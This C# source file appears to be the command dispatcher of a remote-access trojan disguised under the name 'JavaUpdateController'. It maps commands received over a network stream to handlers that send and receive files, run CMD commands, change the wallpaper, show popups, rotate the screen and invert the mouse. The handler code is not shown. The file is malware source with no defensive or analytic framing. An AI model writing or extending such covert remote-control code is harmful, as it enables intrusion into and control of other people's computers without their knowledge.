using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using JavaUpdateController;

namespace JavaUpdateController
{
    class FactoryCommand
    {
        private static Inverter MouseInv;
        private static ShowMessage Show;
        private static Wallpaper BG;
        private static Rotation Rot;
        private static Navigation Nav;
        private static GetFile Get;
        private static SendFile Send;
        private static CMDCustom cmd;

        public static ICommand GetCommand(int command, NetworkStream stream)
        {
            switch(command)
            {
                case (Constants.NAVIGATE):
                    {
                        if (Nav == null)
                        {
                            Nav = new Navigation(stream);
                        }

                        return Nav;
                    }
                case (Constants.INVERT):
                    {
                        if (MouseInv == null)
                        {
                            MouseInv = new Inverter(true, true);
                        }
                        
                        return MouseInv;
                    }
                case (Constants.RECFILE):
                    {
                        if (Get == null)
                        {
                            Get = new GetFile(stream);
                        }

                        return Get;
                    }
                case (Constants.CHGBG):
                    {
                        if (BG == null)
                        {
                            BG = new Wallpaper();
                        }

                        return BG;
                    }
                case (Constants.POPUP):
                    {
                        if (Show == null)
                        {
                            Show = new ShowMessage();
                        }

                        return Show;
                    }
                case (Constants.ROT):
                    {
                        if (Rot == null)
                        {
                            Rot = new Rotation();
                        }

                        return Rot;
                    }

                case (Constants.SENDFILE):
                    {
                        if (Send == null)
                        {
                            Send = new SendFile(stream);
                        }

                        return Send;
                    }
                case (Constants.CMD):
                    {
                        if (cmd == null)
                        {
                            cmd = new CMDCustom();
                        }

                        return cmd;
                    }
            }

            return null;
        }
    }
}
